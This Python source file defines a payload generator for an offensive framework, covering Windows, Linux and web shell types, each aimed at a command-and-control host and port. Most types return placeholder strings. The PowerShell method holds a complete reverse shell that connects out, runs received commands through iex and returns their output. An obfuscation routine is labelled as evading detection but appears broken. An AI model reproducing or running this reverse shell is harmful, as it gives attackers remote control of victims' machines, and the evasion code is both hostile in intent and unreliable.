import os
import base64
import random
import string
from typing import Dict, List, Optional

class PayloadGenerator:
    """Generates various types of payloads for different platforms"""
    
    def __init__(self):
        self.payload_templates = {
            'windows': {
                'exe': self._generate_windows_exe,
                'dll': self._generate_windows_dll,
                'powershell': self._generate_powershell,
                'hta': self._generate_hta,
                'macro': self._generate_office_macro
            },
            'linux': {
                'elf': self._generate_linux_elf,
                'shell': self._generate_shell_script,
                'shared': self._generate_shared_object
            },
            'web': {
                'php': self._generate_php,
                'jsp': self._generate_jsp,
                'asp': self._generate_asp
            }
        }
    
    def generate_payload(self, platform: str, payload_type: str, c2_host: str, 
                        c2_port: int, obfuscate: bool = False) -> str:
        """Generate a payload for the specified platform and type"""
        if platform not in self.payload_templates:
            raise ValueError(f"Unsupported platform: {platform}")
        
        if payload_type not in self.payload_templates[platform]:
            raise ValueError(f"Unsupported payload type: {payload_type}")
        
        generator = self.payload_templates[platform][payload_type]
        payload = generator(c2_host, c2_port)
        
        if obfuscate:
            payload = self._obfuscate_payload(payload, platform)
        
        return payload
    
    def _generate_windows_exe(self, c2_host: str, c2_port: int) -> str:
        """Generate a Windows executable payload"""
        # This would typically use a tool like msfvenom or custom shellcode
        # For now, return a placeholder
        return f"Windows EXE payload connecting to {c2_host}:{c2_port}"
    
    def _generate_windows_dll(self, c2_host: str, c2_port: int) -> str:
        """Generate a Windows DLL payload"""
        return f"Windows DLL payload connecting to {c2_host}:{c2_port}"
    
    def _generate_hta(self, c2_host: str, c2_port: int) -> str:
        """Generate a Windows HTA payload"""
        return f"Windows HTA payload connecting to {c2_host}:{c2_port}"
    
    def _generate_office_macro(self, c2_host: str, c2_port: int) -> str:
        """Generate a Windows Office Macro payload"""
        return f"Windows Office Macro payload connecting to {c2_host}:{c2_port}"
    
    def _generate_linux_elf(self, c2_host: str, c2_port: int) -> str:
        """Generate a Linux ELF payload"""
        return f"Linux ELF payload connecting to {c2_host}:{c2_port}"
    
    def _generate_shell_script(self, c2_host: str, c2_port: int) -> str:
        """Generate a Linux shell script payload"""
        return f"Linux shell script payload connecting to {c2_host}:{c2_port}"
    
    def _generate_shared_object(self, c2_host: str, c2_port: int) -> str:
        """Generate a Linux shared object (.so) payload"""
        return f"Linux shared object payload connecting to {c2_host}:{c2_port}"
    
    def _generate_php(self, c2_host: str, c2_port: int) -> str:
        """Generate a PHP web shell payload"""
        return f"PHP web shell payload connecting to {c2_host}:{c2_port}"
    
    def _generate_jsp(self, c2_host: str, c2_port: int) -> str:
        """Generate a JSP web shell payload"""
        return f"JSP web shell payload connecting to {c2_host}:{c2_port}"
    
    def _generate_asp(self, c2_host: str, c2_port: int) -> str:
        """Generate an ASP web shell payload"""
        return f"ASP web shell payload connecting to {c2_host}:{c2_port}"

    def _generate_powershell(self, c2_host: str, c2_port: int) -> str:
        """Generate a PowerShell payload"""
        return f"""
        $client = New-Object System.Net.Sockets.TCPClient('{c2_host}',{c2_port});
        $stream = $client.GetStream();
        [byte[]]$bytes = 0..65535|%{{0}};
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {{
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
            $sendback = (iex $data 2>&1 | Out-String );
            $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
            $stream.Write($sendbyte,0,$sendbyte.Length);
            $stream.Flush();
        }}
        $client.Close();
        """
    
    def _obfuscate_payload(self, payload: str, platform: str) -> str:
        """Obfuscate the payload to evade detection"""
        if platform == 'windows' and 'powershell' in payload.lower():
            # Simple PowerShell obfuscation
            payload = payload.replace(' ', ' ')
            payload = payload.replace('(', '(`')
            payload = payload.replace(')', '`)')
            # Add more obfuscation techniques as needed
        
        return payload